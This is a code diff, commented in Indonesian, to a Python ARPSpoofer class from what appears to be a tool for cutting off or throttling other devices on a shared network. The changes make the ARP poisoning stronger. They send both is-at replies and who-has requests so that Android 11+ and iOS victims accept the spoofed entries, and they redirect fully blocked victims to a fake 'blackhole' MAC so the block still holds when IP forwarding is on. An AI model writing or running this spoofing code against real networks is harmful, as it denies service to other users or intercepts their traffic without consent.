@@ -201,9 +201,15 @@ class ARPSpoofer:
         Ether.src tetap self_mac (frame fisik dari kita); hanya hwsrc ARP yang berubah.
         """
         hwsrc = (poison_mac or self._self_mac)
-        ether_reply = Ether(dst=target_mac, src=self._self_mac)
+        ether = Ether(dst=target_mac, src=self._self_mac)
+        # DUAL-OPCODE POISON (paritas dengan restore):
+        # 1. is-at: unsolicited ARP reply standar.
+        # 2. who-has: ARP request yang mengklaim `spoof_ip` berada di `hwsrc` — memaksa update
+        #    cache pada Android 11+/iOS yang mengabaikan unsolicited reply (arp_accept=0) &
+        #    memicu NUD pulih ke router bila hanya reply. hwdst = target_mac (unicast ke korban).
         arp_reply = ARP(op="is-at", psrc=spoof_ip, pdst=target_ip, hwsrc=hwsrc, hwdst=target_mac)
-        return [ether_reply / arp_reply]
+        arp_request = ARP(op="who-has", psrc=spoof_ip, pdst=target_ip, hwsrc=hwsrc, hwdst=target_mac)
+        return [ether / arp_reply, ether / arp_request]
 
     def _build_restore_packets(self, victim_ip: str, victim_mac: str, gateway_ip: str, gateway_mac: str) -> Tuple[List[Ether], List[Ether]]:
         """
@@ -475,6 +481,13 @@ class ARPSpoofer:
                     f"Gagal menghentikan session sebelumnya {old_sid}: {e}"
                 ) from e
 
+        # Blackhole MAC dipakai untuk: (a) mode Gaming (blackhole=True), DAN (b) BLOK PENUH
+        # (speed_limit<=0 & bukan redirect). Blok penuh dengan poison ke self-MAC BOCOR bila IP
+        # forwarding global Windows sedang ON (mis. ada sesi redirect/transparent-gateway lain):
+        # kernel meneruskan paket korban ke router. Poison ke MAC hantu membuat trafik korban
+        # jatuh murni di L2 (AP/switch), kebal status forwarding (SP-5/D).
+        use_blackhole = bool(blackhole) or (int(speed_limit) <= 0 and not is_redirect)
+
         # Koordinasi IPv6 Dual-Stack jika target memiliki IPv6
         v6_session_id = None
         if victim_ipv6 and gateway_ipv6:
@@ -485,7 +498,7 @@ class ARPSpoofer:
                     gateway_ipv6=gateway_ipv6,
                     gateway_mac=gateway_mac,
                     speed_limit=speed_limit,
-                    blackhole=blackhole
+                    blackhole=use_blackhole
                 )
             except Exception as e:
                 logger.warning(f"Notice starting coordinated IPv6 session: {e}")
@@ -503,8 +516,9 @@ class ARPSpoofer:
                 'v6_session_id': v6_session_id,
                 'speed_limit': max(0, min(100, int(speed_limit))),
                 'is_redirect': is_redirect,
-                # MAC hantu untuk mode blackhole (Gaming) agar trafik korban tak menyentuh operator.
-                'blackhole_mac': self._generate_blackhole_mac(victim_mac, gateway_mac) if blackhole else None,
+                # MAC hantu untuk blackhole (Gaming ATAU blok penuh) agar trafik korban jatuh di
+                # L2 & tak menyentuh operator — kebal status IP forwarding global (SP-5/D).
+                'blackhole_mac': self._generate_blackhole_mac(victim_mac, gateway_mac) if use_blackhole else None,
                 'active': True,
                 'started_at': time.time(),
                 'packets_sent': 0
